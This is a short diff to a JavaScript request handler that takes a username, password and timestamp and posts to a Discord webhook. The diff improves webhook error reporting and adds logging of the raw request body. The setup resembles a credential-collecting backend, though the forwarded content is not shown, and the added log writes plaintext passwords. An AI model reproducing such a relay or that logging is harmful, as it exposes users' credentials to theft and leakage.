@@ -19,7 +19,10 @@ module.exports = async (req, res) => {
           }]
         })
       });
-      if (!response.ok) throw new Error(`Discord webhook failed: ${response.status}`);
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Discord webhook failed: ${response.status} ${errorText}`);
+      }
       return true;
     } catch (error) {
       console.error(`Discord webhook error (attempt ${maxRetries - retries + 1}): ${error.message}`);
@@ -29,6 +32,7 @@ module.exports = async (req, res) => {
   }
 
   try {
+    console.log("Received payload:", req.body);
     const { username, password, timestamp } = req.body;
     if (!username || !password || !timestamp) {
       console.error("Missing required fields:", req.body);
